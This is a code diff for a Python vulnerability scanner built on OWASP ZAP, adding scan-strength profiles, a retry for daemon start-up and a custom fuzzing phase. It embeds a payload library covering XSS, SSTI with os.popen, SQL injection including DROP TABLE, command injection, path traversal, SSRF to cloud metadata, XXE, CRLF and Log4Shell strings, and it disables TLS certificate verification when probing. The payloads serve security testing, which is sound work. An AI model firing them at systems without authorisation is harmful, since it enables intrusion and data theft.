@@ -71,6 +71,13 @@ class ScanType(Enum):
     FULL = "full"
 
 
+class ScanStrength(Enum):
+    """ZAP scan strength profiles"""
+    STANDARD = "standard"
+    THOROUGH = "thorough"
+    INSANE = "insane"
+
+
 @dataclass
 class VulnerabilityFinding:
     """A single vulnerability finding"""
@@ -223,6 +230,209 @@ class AdvancedVulnScanner:
     ZAP_STARTUP_TIMEOUT = 60  # seconds to wait for ZAP to start
     ZAP_SCAN_POLICIES = ['Default Policy', 'Light', 'Medium', 'High']
 
+    # Scan strength profiles for deep scanning
+    SCAN_STRENGTH_PROFILES = {
+        'standard': {
+            'attack_strength': 'MEDIUM',
+            'alert_threshold': 'MEDIUM',
+            'spider_max_children': 20,
+            'spider_timeout': 300,
+            'ajax_timeout': 60,
+            'ajax_timeout_auth': 120,
+            'active_scan_timeout': 1800,
+            'stall_threshold': 24,
+            'threads_per_host': 2,
+            'spider_depth': 5,
+            'enable_fuzzer': False,
+            'payloads_per_param': 0,
+        },
+        'thorough': {
+            'attack_strength': 'HIGH',
+            'alert_threshold': 'LOW',
+            'spider_max_children': 30,
+            'spider_timeout': 450,
+            'ajax_timeout': 90,
+            'ajax_timeout_auth': 180,
+            'active_scan_timeout': 2700,
+            'stall_threshold': 36,
+            'threads_per_host': 3,
+            'spider_depth': 8,
+            'enable_fuzzer': True,
+            'payloads_per_param': 20,
+        },
+        'insane': {
+            'attack_strength': 'INSANE',
+            'alert_threshold': 'LOW',
+            'spider_max_children': 50,
+            'spider_timeout': 900,
+            'ajax_timeout': 180,
+            'ajax_timeout_auth': 300,
+            'active_scan_timeout': 5400,
+            'stall_threshold': 60,
+            'threads_per_host': 5,
+            'spider_depth': 12,
+            'enable_fuzzer': True,
+            'payloads_per_param': 50,
+        },
+    }
+
+    # Injection scanner plugin IDs for scan policy configuration
+    ZAP_INJECTION_SCANNER_IDS = [
+        # XSS
+        40012, 40014, 40016, 40017,
+        # SQL Injection
+        40018, 40019, 40020, 40021, 40022, 40024, 40026, 40027,
+        # Remote Code Execution / Injection
+        40003, 40008, 40009, 40032, 40033, 90019, 90020, 90025,
+        # XXE / XML
+        40034, 90023, 90029,
+        # SSRF
+        40046, 90034,
+        # Deserialization
+        90035, 90036,
+        # Log4Shell / Spring4Shell
+        40043, 40045,
+        # Path Traversal / File Inclusion
+        6, 7, 10045, 10095,
+        # Session / Auth
+        40013, 40026, 10058,
+        # Header / Protocol
+        10105, 10104,
+        # Misc injection
+        30001, 30002, 90021, 90024, 40028, 10048,
+        # LDAP / NoSQL
+        40015, 90028,
+    ]
+
+    # Ragnar-Fuzz payload library
+    RAGNAR_FUZZ_PAYLOADS = {
+        'xss_basic': [
+            '<script>alert(1)</script>',
+            '"><script>alert(1)</script>',
+            "'-alert(1)-'",
+            '<img src=x onerror=alert(1)>',
+            '"><img src=x onerror=alert(1)>',
+            '<svg onload=alert(1)>',
+            '<body onload=alert(1)>',
+            '<input onfocus=alert(1) autofocus>',
+            '<details open ontoggle=alert(1)>',
+            '<marquee onstart=alert(1)>',
+        ],
+        'xss_polyglot': [
+            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
+            '"><img src=x onerror=alert(String.fromCharCode(88,83,83))>',
+            '<svg/onload=alert`1`>',
+        ],
+        'xss_waf_bypass': [
+            '<scr<script>ipt>alert(1)</scr</script>ipt>',
+            '%3Cscript%3Ealert(1)%3C/script%3E',
+            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
+            '<img src=x onerror=\\u0061lert(1)>',
+        ],
+        'xss_attribute': [
+            '" onfocus="alert(1)" autofocus="',
+            "' onfocus='alert(1)' autofocus='",
+            '" onmouseover="alert(1)" "',
+            "' onmouseover='alert(1)' '",
+        ],
+        'xss_js_context': [
+            "';alert(1)//",
+            '";alert(1)//',
+            '</script><script>alert(1)</script>',
+            "\\';alert(1);//",
+            "javascript:alert(1)",
+            "javascript:alert(1)//",
+        ],
+        'xss_js_uri': [
+            'javascript:alert(1)',
+            'jAvAsCrIpT:alert(1)',
+            'data:text/html,<script>alert(1)</script>',
+            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+            'vbscript:alert(1)',
+        ],
+        'xss_url_encoded': [
+            '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
+            '%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E',
+            '%27%3E%3Csvg%20onload%3Dalert(1)%3E',
+        ],
+        'xss_double_encoded': [
+            '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
+            '%2522%253E%253Cscript%253Ealert(1)%253C%252Fscript%253E',
+        ],
+        'xss_unicode': [
+            '\u003cscript\u003ealert(1)\u003c/script\u003e',
+            '\uff1cscript\uff1ealert(1)\uff1c/script\uff1e',
+            '\u0022\u003e\u003cscript\u003ealert(1)\u003c/script\u003e',
+        ],
+        'xss_html_entity': [
+            '&#60;script&#62;alert(1)&#60;/script&#62;',
+            '&lt;script&gt;alert(1)&lt;/script&gt;',
+            '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
+            '&quot; onfocus=&quot;alert(1)&quot; autofocus=&quot;',
+        ],
+        'ssti': [
+            '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}',
+            '{{constructor.constructor("return this")()}}',
+            '${T(java.lang.Runtime).getRuntime().exec("id")}',
+            '{% import os %}{{ os.popen("id").read() }}',
+            '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
+            '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
+            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
+        ],
+        'sqli': [
+            "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
+            "1 UNION SELECT NULL--", "1' AND SLEEP(5)--",
+            "' WAITFOR DELAY '0:0:5'--",
+            "1; DROP TABLE users--",
+            "admin'--", "' OR ''='",
+            "1' ORDER BY 1--",
+            "') OR ('1'='1",
+            "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+        ],
+        'cmdi': [
+            '; id', '| id', '`id`', '$(id)',
+            '; cat /etc/passwd', '| cat /etc/passwd',
+            '& whoami', '&& whoami',
+        ],
+        'path_traversal': [
+            '../../../etc/passwd',
+            '..\\..\\..\\windows\\win.ini',
+            '....//....//....//etc/passwd',
+            '..%2f..%2f..%2fetc%2fpasswd',
+            '..%252f..%252f..%252fetc%252fpasswd',
+        ],
+        'ssrf': [
+            'http://127.0.0.1',
+            'http://169.254.169.254/latest/meta-data/',
+            'http://[::1]',
+            'http://0x7f000001',
+            'http://localhost:22',
+        ],
+        'xxe': [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+        ],
+        'crlf': [
+            '%0d%0aSet-Cookie:ragnar=test',
+            '\\r\\nX-Injected: ragnar',
+            '%0AHost: evil.com',
+        ],
+        'log4shell': [
+            '${jndi:ldap://127.0.0.1/a}',
+            '${jndi:dns://127.0.0.1/a}',
+        ],
+        'deserialization': [
+            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',
+            'O:8:"stdClass":0:{}',
+            'a]a:1:{s:1:"a";O:8:"stdClass":0:{}}',
+        ],
+    }
+
+    # Common test parameter names for synthetic fuzz targets
+    FUZZ_SYNTHETIC_PARAMS = [
+        'id', 'q', 'search', 'query', 'name', 'page', 'redirect',
+        'url', 'file', 'path', 'callback', 'next', 'return', 'ref',
+    ]
+
     def __init__(self, shared_data=None):
         self.shared_data = shared_data
         self._lock = threading.Lock()
@@ -323,18 +533,40 @@ class AdvancedVulnScanner:
             logger.error(f"Error recovering interrupted scans: {e}")
 
     def _auto_start_zap(self):
-        """Auto-start ZAP daemon in background so it's always available"""
-        try:
-            if not self._is_zap_running():
-                logger.info("Auto-starting ZAP daemon...")
+        """Auto-start ZAP daemon in background with retries.
+
+        ZAP is a heavy Java app that must always be running in server mode.
+        On ARM (Raspberry Pi) it can take 2-3 minutes to start.  If the
+        first attempt fails we retry with increasing backoff so the daemon
+        eventually comes up without blocking the main thread.
+        """
+        max_retries = 3
+        retry_delays = [10, 30, 60]  # seconds between retries
+
+        for attempt in range(max_retries + 1):
+            try:
+                if self._is_zap_running():
+                    logger.info("ZAP daemon already running")
+                    return
+
+                label = f"(attempt {attempt + 1}/{max_retries + 1})" if attempt > 0 else ""
+                logger.info(f"Auto-starting ZAP daemon... {label}")
+
                 if self.start_zap_daemon():
                     logger.info("ZAP daemon auto-started successfully")
+                    return
                 else:
-                    logger.warning("Failed to auto-start ZAP daemon")
-            else:
-                logger.info("ZAP daemon already running")
-        except Exception as e:
-            logger.warning(f"ZAP auto-start error: {e}")
+                    logger.warning(f"ZAP daemon auto-start failed {label}")
+            except Exception as e:
+                logger.warning(f"ZAP auto-start error {label}: {e}")
+
+            if attempt < max_retries:
+                delay = retry_delays[min(attempt, len(retry_delays) - 1)]
+                logger.info(f"Retrying ZAP auto-start in {delay}s...")
+                time.sleep(delay)
+
+        logger.error("ZAP daemon failed to auto-start after all retries. "
+                     "Scans requiring ZAP will attempt to start it on demand.")
 
     def _dict_to_finding(self, data: Dict) -> VulnerabilityFinding:
         """Convert a dictionary (from DB) back to VulnerabilityFinding"""
@@ -468,6 +700,66 @@ class AdvancedVulnScanner:
         if progress:
             return progress.log_entries[since_index:]
         return []
+
+    def _get_strength_profile(self, options: Dict) -> Dict:
+        """Get scan strength profile configuration from options."""
+        strength = options.get('scan_strength', 'standard')
+        return self.SCAN_STRENGTH_PROFILES.get(strength, self.SCAN_STRENGTH_PROFILES['standard'])
+
+    def _build_fuzz_auth_headers(self, options: Dict) -> Dict[str, str]:
+        """Build HTTP headers dict from scan auth options for direct requests."""
+        headers = {}
+        if not options:
+            return headers
+        if options.get('bearer_token'):
+            headers['Authorization'] = f"Bearer {options['bearer_token']}"
+        elif options.get('http_basic_auth'):
+            import base64
+            creds = options['http_basic_auth']
+            encoded = base64.b64encode(creds.encode('utf-8')).decode('utf-8')
+            headers['Authorization'] = f"Basic {encoded}"
+        elif options.get('api_key'):
+            header_name = options.get('api_key_header', 'X-API-Key')
+            headers[header_name] = options['api_key']
+        elif options.get('cookie_value'):
+            headers['Cookie'] = options['cookie_value']
+        elif options.get('oauth2_client_creds'):
+            creds = options['oauth2_client_creds']
+            token = self._obtain_oauth2_token_for_fuzz(creds)
+            if token:
+                headers['Authorization'] = f"Bearer {token}"
+        # Also include custom headers if specified
+        custom = options.get('custom_headers', '')
+        if custom:
+            for line in custom.strip().split('\n'):
+                if ':' in line:
+                    key, val = line.split(':', 1)
+                    headers[key.strip()] = val.strip()
+        return headers
+
+    def _obtain_oauth2_token_for_fuzz(self, creds: Dict) -> Optional[str]:
+        """Obtain an OAuth2 token for fuzzer direct requests."""
+        token_url = creds.get('token_url', '')
+        client_id = creds.get('client_id', '')
+        client_secret = creds.get('client_secret', '')
+        scope = creds.get('scope', '')
+        if not token_url or not client_id or not client_secret:
+            return None
+        try:
+            data = urllib.parse.urlencode({
+                'grant_type': 'client_credentials',
+                'client_id': client_id,
+                'client_secret': client_secret,
+                'scope': scope,
+            }).encode('utf-8')
+            req = urllib.request.Request(token_url, data=data, method='POST')
+            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+            with urllib.request.urlopen(req, timeout=15) as resp:
+                token_data = json.loads(resp.read().decode('utf-8'))
+                return token_data.get('access_token')
+        except Exception as e:
+            logger.warning(f"OAuth2 token acquisition for fuzz failed: {e}")
+            return None
 
     def _generate_api_key(self) -> str:
         """Generate a random API key for ZAP"""
@@ -1430,7 +1722,18 @@ class AdvancedVulnScanner:
 
         zap_path = self._tool_paths.get('zap')
         if not zap_path:
-            logger.error("OWASP ZAP not installed")
+            logger.error("OWASP ZAP not installed - no zap binary found in known locations")
+            return False
+
+        if not os.path.exists(zap_path):
+            logger.error(f"ZAP binary path no longer exists: {zap_path}")
+            return False
+
+        # Verify Java is available (ZAP requires Java 11+)
+        java_path = shutil.which('java')
+        if not java_path:
+            logger.error("Java not found in PATH - ZAP requires Java 11+ to run. "
+                         "Install with: sudo apt install default-jre")
             return False
 
         port = port or self._zap_port
@@ -1441,29 +1744,26 @@ class AdvancedVulnScanner:
         import sys
         is_windows = sys.platform == 'win32'
 
-        if is_windows:
-            # Windows uses .bat file or java directly
-            cmd = [
-                zap_path,
-                '-daemon',
-                '-port', str(port),
-                '-config', f'api.key={self._zap_api_key}',
-                '-config', 'api.addrs.addr.name=127.0.0.1',
-                '-config', 'api.addrs.addr.regex=true',
-                '-config', 'connection.timeoutInSecs=120',
-            ]
-        else:
-            cmd = [
-                zap_path,
-                '-daemon',
-                '-port', str(port),
-                '-config', f'api.key={self._zap_api_key}',
-                '-config', 'api.addrs.addr.name=127.0.0.1',
-                '-config', 'api.addrs.addr.regex=true',
-                '-config', 'connection.timeoutInSecs=120',
-            ]
+        cmd = [
+            zap_path,
+            '-daemon',
+            '-port', str(port),
+            '-config', f'api.key={self._zap_api_key}',
+            '-config', 'api.addrs.addr.name=127.0.0.1',
+            '-config', 'api.addrs.addr.regex=true',
+            '-config', 'connection.timeoutInSecs=120',
+        ]
 
-        logger.info(f"Starting ZAP daemon on port {port}...")
+        logger.info(f"Starting ZAP daemon: {' '.join(cmd[:3])}... (port {port})")
+        logger.info(f"ZAP binary: {zap_path}")
+
+        # Detect ARM/Raspberry Pi - ZAP needs much longer startup on ARM
+        import platform
+        machine = platform.machine().lower()
+        is_arm = any(arch in machine for arch in ('arm', 'aarch64'))
+        startup_timeout = 180 if is_arm else self.ZAP_STARTUP_TIMEOUT
+        if is_arm:
+            logger.info(f"ARM platform detected ({machine}) - using extended startup timeout: {startup_timeout}s")
 
         try:
             # Use shell=True on Windows for .bat files
@@ -1478,18 +1778,53 @@ class AdvancedVulnScanner:
                 popen_kwargs['creationflags'] = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
 
             self._zap_process = subprocess.Popen(cmd, **popen_kwargs)
+            logger.info(f"ZAP process launched (PID: {self._zap_process.pid})")
 
             # Wait for ZAP to start
             start_time = time.time()
-            while time.time() - start_time < self.ZAP_STARTUP_TIMEOUT:
-                if self._is_zap_running():
-                    logger.info(f"ZAP daemon started successfully on port {port}")
-                    return True
-                time.sleep(2)
+            while time.time() - start_time < startup_timeout:
+                # Check if process has exited early (crash/error)
+                retcode = self._zap_process.poll()
+                if retcode is not None:
+                    stderr_output = ''
+                    try:
+                        stderr_output = self._zap_process.stderr.read()[:2000]
+                    except Exception:
+                        pass
+                    logger.error(f"ZAP process exited early with code {retcode}")
+                    if stderr_output:
+                        logger.error(f"ZAP stderr: {stderr_output}")
+                    return False
 
-            logger.error("ZAP daemon failed to start within timeout")
+                if self._is_zap_running():
+                    elapsed = int(time.time() - start_time)
+                    logger.info(f"ZAP daemon started successfully on port {port} ({elapsed}s)")
+                    return True
+                time.sleep(3)
+
+            # Timeout reached - capture diagnostics
+            elapsed = int(time.time() - start_time)
+            logger.error(f"ZAP daemon failed to start within {startup_timeout}s timeout")
+            retcode = self._zap_process.poll()
+            if retcode is not None:
+                logger.error(f"ZAP process exited with code {retcode} during timeout wait")
+                try:
+                    stderr_output = self._zap_process.stderr.read()[:2000]
+                    if stderr_output:
+                        logger.error(f"ZAP stderr: {stderr_output}")
+                except Exception:
+                    pass
+            else:
+                logger.error(f"ZAP process still running (PID: {self._zap_process.pid}) "
+                             f"but not responding on port {port}")
             return False
 
+        except FileNotFoundError:
+            logger.error(f"ZAP binary not found or not executable: {zap_path}")
+            return False
+        except PermissionError:
+            logger.error(f"Permission denied running ZAP binary: {zap_path}")
+            return False
         except Exception as e:
             logger.error(f"Failed to start ZAP daemon: {e}")
             return False
@@ -1729,14 +2064,33 @@ class AdvancedVulnScanner:
             '/swagger/v1/swagger.json',
             '/api/openapi.json',
             '/api/swagger.json',
+            '/api-docs',
+            '/api-docs.json',
+            '/docs/openapi.json',
+            '/swagger/doc.json',
+            '/api/v1/openapi.json',
+            '/api/v1/swagger.json',
+            '/api/v2/openapi.json',
+            '/.well-known/openapi.json',
         ]
+
+        # Build auth headers for probing (specs may be behind auth)
+        auth_headers = self._build_fuzz_auth_headers(options) if options else {}
 
         for probe_path in common_paths:
             probe_url = f"{base}{probe_path}"
             try:
                 probe_req = urllib.request.Request(probe_url, method='GET')
                 probe_req.add_header('Accept', 'application/json')
-                with urllib.request.urlopen(probe_req, timeout=8) as resp:
+                for h_name, h_value in auth_headers.items():
+                    probe_req.add_header(h_name, h_value)
+                ssl_ctx = None
+                if probe_url.startswith('https'):
+                    import ssl
+                    ssl_ctx = ssl.create_default_context()
+                    ssl_ctx.check_hostname = False
+                    ssl_ctx.verify_mode = ssl.CERT_NONE
+                with urllib.request.urlopen(probe_req, timeout=8, context=ssl_ctx) as resp:
                     body = resp.read().decode('utf-8')
                     spec = json.loads(body)
                     if 'paths' in spec and spec['paths']:
@@ -1993,12 +2347,15 @@ class AdvancedVulnScanner:
             raise RuntimeError(error_msg)
 
     def _run_zap_active_scan(self, scan_id: str, target: str, options: Dict):
-        """Run ZAP active vulnerability scan"""
+        """Run ZAP active vulnerability scan with strength-aware configuration."""
         if not self._is_zap_running():
             if not self.start_zap_daemon():
                 raise RuntimeError("Failed to start ZAP daemon")
 
         progress = self.active_scans[scan_id]
+        profile = self._get_strength_profile(options)
+        strength = options.get('scan_strength', 'standard')
+        policy_name = None
 
         # Clear previous session to avoid stale alerts from other targets
         progress.current_check = "Clearing previous ZAP session..."
@@ -2023,12 +2380,21 @@ class AdvancedVulnScanner:
             self._setup_api_scan(target, options, progress)
 
         # Auto-discover OpenAPI spec on target when no spec URL was provided.
-        # Runs in EVERY scan mode (Web or API) so endpoints are always seeded.
         if not options.get('openapi_url'):
             try:
                 self._auto_discover_openapi_spec(target, options, progress)
             except Exception as e:
                 logger.debug(f"OpenAPI auto-discovery skipped: {e}")
+
+        # Configure input vectors for thorough/insane
+        if strength != 'standard':
+            progress.current_check = "Configuring scan input vectors..."
+            self._configure_zap_input_vectors(scan_id, options)
+
+        # Create scan policy for thorough/insane
+        if strength != 'standard':
+            progress.current_check = "Creating scan policy..."
+            policy_name = self._create_zap_scan_policy(scan_id, options)
 
         progress.current_check = "Starting ZAP active scan..."
 
@@ -2049,26 +2415,25 @@ class AdvancedVulnScanner:
 
             # Run a quick spider first to discover URLs for active scanning
             progress.current_check = "Quick spider to discover URLs..."
-            logger.info(f"Running quick spider before active scan on {target}")
+            self._scan_log(scan_id, 'info', f"Running quick spider before active scan on {target}")
 
             spider_resp = self._zap_api_call('JSON/spider/action/scan', {
                 'url': target,
-                'maxChildren': '5',
+                'maxChildren': str(profile['spider_max_children']),
                 'recurse': 'true',
                 'subtreeOnly': 'true'
             })
             spider_id = spider_resp.get('scan')
 
             if spider_id:
-                # Wait for spider to complete (with timeout)
                 spider_start = time.time()
-                spider_timeout = 120  # 2 minutes max for quick spider
+                spider_timeout = min(profile['spider_timeout'], 300)
 
                 while time.time() - spider_start < spider_timeout:
                     try:
                         status_resp = self._zap_api_call('JSON/spider/view/status', {'scanId': spider_id})
                         spider_progress = int(status_resp.get('status', 0))
-                        progress.progress_percent = int(spider_progress * 0.2)  # 0-20% for spider
+                        progress.progress_percent = int(spider_progress * 0.2)
                         progress.current_check = f"Discovering URLs... {spider_progress}%"
 
                         if spider_progress >= 100:
@@ -2079,18 +2444,14 @@ class AdvancedVulnScanner:
 
                     time.sleep(2)
 
-                # Get URLs found
                 try:
                     results_resp = self._zap_api_call('JSON/spider/view/results', {'scanId': spider_id})
                     urls_found = results_resp.get('results', [])
-                    logger.info(f"Quick spider found {len(urls_found)} URLs")
+                    self._scan_log(scan_id, 'info', f"Quick spider found {len(urls_found)} URLs")
                 except Exception:
-                    urls_found = []
+                    pass
 
-            # Configure scan policy if specified
-            scan_policy = options.get('scan_policy', 'Default Policy')
-
-            # Start active scan
+            # Start active scan with policy if available
             progress.current_check = "Starting active vulnerability scan..."
             scan_params = {
                 'url': target,
@@ -2098,8 +2459,12 @@ class AdvancedVulnScanner:
                 'inScopeOnly': str(options.get('in_scope_only', True)).lower(),
             }
 
-            if scan_policy and scan_policy in self.ZAP_SCAN_POLICIES:
-                scan_params['scanPolicyName'] = scan_policy
+            if policy_name:
+                scan_params['scanPolicyName'] = policy_name
+            else:
+                scan_policy = options.get('scan_policy', 'Default Policy')
+                if scan_policy and scan_policy in self.ZAP_SCAN_POLICIES:
+                    scan_params['scanPolicyName'] = scan_policy
 
             scan_resp = self._zap_api_call('JSON/ascan/action/scan', scan_params)
             scan_id_zap = scan_resp.get('scan')
@@ -2107,11 +2472,11 @@ class AdvancedVulnScanner:
             if not scan_id_zap:
                 raise RuntimeError("Failed to start ZAP active scan - no scan ID returned")
 
-            logger.info(f"ZAP active scan started with ID: {scan_id_zap}")
+            self._scan_log(scan_id, 'info', f"ZAP active scan started with ID: {scan_id_zap}")
 
             # Monitor scan progress with timeout
             scan_start = time.time()
-            scan_timeout = 1800  # 30 minutes max for active scan
+            scan_timeout = profile['active_scan_timeout']
             last_progress = -1
             stall_count = 0
 
@@ -2120,30 +2485,24 @@ class AdvancedVulnScanner:
                     status_resp = self._zap_api_call('JSON/ascan/view/status', {'scanId': scan_id_zap})
                     scan_progress = int(status_resp.get('status', 0))
 
-                    # Map 0-100 to 20-100 (spider was 0-20)
                     progress.progress_percent = 20 + int(scan_progress * 0.8)
                     progress.current_check = f"Active scanning... {scan_progress}%"
 
-                    # Update findings count filtered by target host
                     try:
                         alerts_resp = self._zap_api_call('JSON/core/view/numberOfAlerts', {'baseurl': target})
                         progress.findings_count = int(alerts_resp.get('numberOfAlerts', 0))
                     except Exception:
-                        pass  # Don't fail scan over progress count
+                        pass
 
                     if scan_progress >= 100:
                         break
 
-                    # Check for stalled scan (no progress for 60 seconds)
                     if scan_progress == last_progress:
                         stall_count += 1
-                        if stall_count >= 12:  # 12 * 5 seconds = 60 seconds
-                            logger.warning(f"Active scan appears stalled at {scan_progress}%, checking if complete")
-                            # Check if scan is actually done
-                            scanners_resp = self._zap_api_call('JSON/ascan/view/scanProgress', {'scanId': scan_id_zap})
-                            if not scanners_resp.get('scanProgress'):
-                                logger.info("Scan appears complete (no active scanners)")
-                                break
+                        if stall_count >= profile['stall_threshold']:
+                            self._scan_log(scan_id, 'warning',
+                                           f"Active scan stalled at {scan_progress}%, stopping...")
+                            break
                     else:
                         stall_count = 0
                         last_progress = scan_progress
@@ -2154,21 +2513,32 @@ class AdvancedVulnScanner:
                 time.sleep(5)
 
             if time.time() - scan_start >= scan_timeout:
-                logger.warning(f"Active scan timed out after {scan_timeout} seconds")
+                self._scan_log(scan_id, 'warning', f"Active scan timed out after {scan_timeout}s")
 
-            logger.info(f"ZAP active scan completed")
+            self._scan_log(scan_id, 'info', "ZAP active scan completed")
+
+            # ragnar-fuzz phase (thorough/insane only)
+            if profile['enable_fuzzer']:
+                progress.current_check = "Running ragnar-fuzz..."
+                self._scan_log(scan_id, 'info', "Starting ragnar-fuzz custom parameter fuzzer...")
+                self._run_zap_parameter_fuzz_phase(scan_id, target, options, progress)
+
+                progress.current_check = "Detecting JSON reflections..."
+                self._scan_log(scan_id, 'info', "Scanning for JSON API reflections...")
+                self._detect_json_reflections(scan_id, target, options, progress)
 
             # Fetch all alerts
             self._fetch_zap_alerts(scan_id, target)
 
         except Exception as e:
             logger.error(f"ZAP active scan error: {e}")
-            # Add auth hint if auth is configured
             error_msg = str(e)
             auth_status = self.zap_get_auth_status()
             if auth_status.get('has_auth'):
                 error_msg += " [Note: Authentication is configured. If target doesn't require auth, clear ZAP auth settings.]"
             raise RuntimeError(error_msg)
+        finally:
+            self._remove_zap_scan_policy(scan_id, policy_name)
 
     def _get_zap_context_id(self, context_name: str = 'default') -> Optional[str]:
         """Get ZAP context ID by name, returns None if not found"""
@@ -2540,12 +2910,23 @@ class AdvancedVulnScanner:
             return (True, 0)  # Assume applied if we can't verify
 
     def _run_zap_full_scan(self, scan_id: str, target: str, options: Dict):
-        """Run complete ZAP scan: spider + ajax spider + active scan"""
+        """Run complete ZAP scan with strength-aware orchestration.
+
+        Standard  (3 phases): Spider → AJAX Spider → Active Scan
+        Thorough+ (5 phases): Spider → AJAX Spider → Active Scan → ragnar-fuzz → JSON Reflections
+        """
         if not self._is_zap_running():
             if not self.start_zap_daemon():
                 raise RuntimeError("Failed to start ZAP daemon")
 
         progress = self.active_scans[scan_id]
+        profile = self._get_strength_profile(options)
+        strength = options.get('scan_strength', 'standard')
+        policy_name = None
+        total_phases = 5 if profile['enable_fuzzer'] else 3
+
+        self._scan_log(scan_id, 'info',
+                       f"ZAP full scan starting with strength={strength}, phases={total_phases}")
 
         # Clear previous session to avoid stale alerts from other targets
         progress.current_check = "Clearing previous ZAP session..."
@@ -2577,26 +2958,50 @@ class AdvancedVulnScanner:
             except Exception as e:
                 logger.debug(f"OpenAPI auto-discovery skipped: {e}")
 
+        # Configure input vectors for thorough/insane
+        if strength != 'standard':
+            progress.current_check = "Configuring scan input vectors..."
+            self._configure_zap_input_vectors(scan_id, options)
+
+        # Create scan policy for thorough/insane
+        if strength != 'standard':
+            progress.current_check = "Creating scan policy..."
+            policy_name = self._create_zap_scan_policy(scan_id, options)
+
         alerts_fetched = False
 
         try:
             # Phase 1: Spider
-            progress.current_check = "Phase 1/3: Running spider..."
-            self._scan_log(scan_id, 'info', "Phase 1/3: Starting spider crawl...")
+            progress.current_check = f"Phase 1/{total_phases}: Running spider..."
+            self._scan_log(scan_id, 'info', f"Phase 1/{total_phases}: Starting spider crawl...")
             self._run_zap_spider_phase(scan_id, target, options, progress)
 
             # Phase 2: Ajax Spider (if enabled)
             if options.get('ajax_spider', True):
-                progress.current_check = "Phase 2/3: Running Ajax spider..."
-                self._scan_log(scan_id, 'info', "Phase 2/3: Starting AJAX spider...")
+                progress.current_check = f"Phase 2/{total_phases}: Running Ajax spider..."
+                self._scan_log(scan_id, 'info', f"Phase 2/{total_phases}: Starting AJAX spider...")
                 self._run_zap_ajax_spider_phase(scan_id, target, options, progress)
 
-            # Phase 3: Active Scan (this now fetches alerts if it stalls)
-            progress.current_check = "Phase 3/3: Running active scan..."
-            self._scan_log(scan_id, 'info', "Phase 3/3: Starting active vulnerability scan...")
-            self._run_zap_active_scan_phase(scan_id, target, options, progress)
+            # Phase 3: Active Scan (with scan policy for thorough/insane)
+            progress.current_check = f"Phase 3/{total_phases}: Running active scan..."
+            self._scan_log(scan_id, 'info', f"Phase 3/{total_phases}: Starting active vulnerability scan...")
+            self._run_zap_active_scan_phase(scan_id, target, options, progress, policy_name)
 
-            # Final: Fetch all alerts (in case active scan completed normally)
+            # Phase 4: ragnar-fuzz (thorough/insane only)
+            if profile['enable_fuzzer']:
+                progress.current_check = f"Phase 4/{total_phases}: Running ragnar-fuzz..."
+                self._scan_log(scan_id, 'info',
+                               f"Phase 4/{total_phases}: Starting ragnar-fuzz custom parameter fuzzer...")
+                self._run_zap_parameter_fuzz_phase(scan_id, target, options, progress)
+
+            # Phase 5: JSON Reflection Detection (thorough/insane only)
+            if profile['enable_fuzzer']:
+                progress.current_check = f"Phase 5/{total_phases}: Detecting JSON reflections..."
+                self._scan_log(scan_id, 'info',
+                               f"Phase 5/{total_phases}: Scanning for JSON API reflections...")
+                self._detect_json_reflections(scan_id, target, options, progress)
+
+            # Final: Fetch all ZAP alerts
             progress.current_check = "Fetching vulnerability alerts..."
             try:
                 self._fetch_zap_alerts(scan_id, target)
@@ -2626,6 +3031,8 @@ class AdvancedVulnScanner:
             if has_auth:
                 self._clear_scan_auth()
                 self._scan_log(scan_id, 'info', "Cleared scan auth rules")
+            # Clean up temporary scan policy
+            self._remove_zap_scan_policy(scan_id, policy_name)
 
     def _run_zap_spider_phase(self, scan_id: str, target: str, options: Dict, progress: ScanProgress):
         """Spider phase of full scan"""
@@ -2660,9 +3067,10 @@ class AdvancedVulnScanner:
             raise
         time.sleep(1)
 
+        profile = self._get_strength_profile(options)
         spider_params = {
             'url': target,
-            'maxChildren': str(options.get('max_children', 20)),
+            'maxChildren': str(options.get('max_children', profile['spider_max_children'])),
             'recurse': 'true',
             'subtreeOnly': 'false' if has_auth else 'true'  # Crawl full domain when authenticated
         }
@@ -2680,14 +3088,19 @@ class AdvancedVulnScanner:
 
         # Spider with timeout
         spider_start = time.time()
-        spider_timeout = 300  # 5 minutes max for spider phase
+        spider_timeout = profile['spider_timeout']
 
         while time.time() - spider_start < spider_timeout:
             try:
                 status_resp = self._zap_api_call('JSON/spider/view/status', {'scanId': spider_id})
                 spider_progress = int(status_resp.get('status', 0))
-                progress.progress_percent = int(spider_progress * 0.3)  # 30% of total
-                progress.current_check = f"Phase 1/3: Spidering... {spider_progress}%"
+                # Scale: 0-20% if fuzzer enabled, 0-30% if standard
+                if profile['enable_fuzzer']:
+                    progress.progress_percent = int(spider_progress * 0.2)
+                else:
+                    progress.progress_percent = int(spider_progress * 0.3)
+                total_phases = 5 if profile['enable_fuzzer'] else 3
+                progress.current_check = f"Phase 1/{total_phases}: Spidering... {spider_progress}%"
 
                 if spider_progress >= 100:
                     break
@@ -2733,7 +3146,9 @@ class AdvancedVulnScanner:
 
             # Use longer duration for authenticated scans (more pages to discover)
             has_auth = options.get('_context_id') or options.get('_has_auth')
-            max_duration = options.get('ajax_spider_duration', 120 if has_auth else 60)
+            profile = self._get_strength_profile(options)
+            max_duration = options.get('ajax_spider_duration',
+                                       profile['ajax_timeout_auth'] if has_auth else profile['ajax_timeout'])
 
             # Set max duration option in ZAP before starting
